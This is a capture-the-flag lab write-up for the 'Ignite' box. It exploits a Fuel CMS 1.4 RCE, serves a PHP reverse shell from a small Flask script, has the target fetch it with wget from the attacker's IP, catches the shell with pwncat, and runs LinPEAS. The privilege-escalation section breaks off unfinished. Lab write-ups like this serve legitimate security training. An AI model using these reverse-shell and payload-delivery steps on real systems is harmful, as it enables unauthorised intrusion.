# Ignite

**CTF Domain: Ignite.ctf**

## Scans

```rustscan -a Ignite.ctf```
```
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack
```

## Eumeration

Rustscan shows 1 port open: :80

Navigating to the website we see the Fuel CMS logo and a version number (1.4)

Running searchsploit to find exploits for that version, three RCE vulnerabilities were found

Since Python is my main language, I downloaded the Python script


## Exploitation

The script works for simple commands, but it seems to throw an error when a slash is in the command

This is an issue as most one line reverse shells require a slash

To work around this, lets make a simple Python script to host a website with a reverse shell

First copy a php reverse shell into your directory and set the IP and port of your listener

Then start a pwncat listener with the platform set to Linux: `pwncat --platform linux -l :9998`

Finally, create a Python script with this code and run it (make sure Flask is installed):
```
from flask import Flask
app = Flask(__name__)
@app.route("/", methods=["GET"])
def main():
    with open("php-reverse-shell.php", "r") as f:
        return f.read()
app.run(host="$IP", port=80)
```

We can then send a simple wget command with our web server: `wget 10.6.122.20 -O revshell.php`

And use a web browser to navigate to our web shell: `http://ignite.ctf/revshell.php`

Now you have a user shell!

## Privilege Escalation

### PrivEsc with Pwncat


run enumerate.file.suid


As always, we'll run LinPEAS to see what we can get

Run these commands and capture LinPEAS output to results.txt so we can read it later

```
(remote) www-data@ubuntu:/$ cd /tmp
(remote) www-data@ubuntu:/tmp$
(local) pwncat$ upload linpeas.sh
(remote) www-data@ubuntu:/tmp$ chmod +x linpeas.sh
(remote) www-data@ubuntu:/tmp$ ./linpeas.sh | tee results.txt
```

Normally, pwncat is great with uploading files but it seemed to have an issue today

/etc/ImageMagick-6/mime.xml

